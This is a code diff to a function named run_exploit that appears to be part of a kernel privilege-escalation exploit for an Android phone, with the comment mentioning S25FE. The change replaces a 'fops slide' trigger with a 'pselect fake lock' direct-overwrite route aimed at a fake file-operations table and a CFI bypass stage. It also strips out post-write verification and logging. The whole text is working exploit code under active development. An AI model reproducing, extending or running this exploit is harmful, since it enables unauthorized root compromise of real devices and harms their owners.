@@ -511,52 +511,17 @@ int run_exploit(int argc, char **argv) {
         continue;
       }
     }
-    int triggered = app_trigger_fops_slide_route();
+        /* S25FE: bypass pselect route and its P0 preparation; direct overwrite */
+    atomic_store(&cfi_stage_done, 0);
+    do_pselect_fake_lock_route();
+    int verified = atomic_load(&cfi_stage_done);
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
-    pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
-            attempt, triggered);
+    pr_info("app fops direct route attempt=%d verified=%d\n",
+            attempt, verified);
 #endif
-    int verified = 0;
-#if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
-    APP_FOPS_DEFER_ALIAS_READBACK && \
-    defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
-    APP_FOPS_DATA_ALIAS_DIAG_ONLY
-    int postwrite_result = 0;
-    int probe_restored = 0;
-    if (fops_data_alias_deferred) {
-      postwrite_result = verify_p0_pipe_data_page(
-          fops_data_alias_deferred_target, fake_fops);
-      probe_restored =
-          app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_RESTORE_SLOT);
-      pr_info("fops postwrite direct read target=%016zx initial=%016llx "
-              "want=%016zx result=%d probe_restored=%d triggered=%d\n",
-              fops_data_alias_deferred_target,
-              (unsigned long long)fops_data_alias_deferred_initial,
-              fake_fops, postwrite_result, probe_restored, triggered);
-#if defined(APP_FOPS_DURABLE_POSTWRITE_LOG) && \
-    APP_FOPS_DURABLE_POSTWRITE_LOG
-      /* Preserve the authoritative result even if RDB dies before
-       * dlopen returns.  stdout may be a pipe (adb shell), where fsync
-       * returns EINVAL: that is not a failure worth aborting for. */
-      fflush(NULL);
-      if (fsync(STDOUT_FILENO) != 0 && errno != EINVAL && errno != EBADF) {
-        pr_warning("fsync stdout errno=%d\n", errno);
-      }
-#endif
-      fops_data_alias_deferred = 0;
-    }
-    if (triggered && postwrite_result == 1 && probe_restored) {
-      verified = try_cfi_stage();
-    } else {
-      cfi_last_step = 35;
-      cfi_last_errno = 0;
-    }
-#else
-    verified = triggered && try_cfi_stage();
-#endif
-    pr_info("app fops slide attempt=%d/%d triggered=%d verified=%d "
+    pr_info("app fops direct route attempt=%d/%d verified=%d "
             "step=%d errno=%d\n",
-            attempt, fops_fresh_page_attempts, triggered, verified,
+            attempt, fops_fresh_page_attempts, verified,
             cfi_last_step, cfi_last_errno);
     if (verified || cfi_dirty_seen) {
       break;
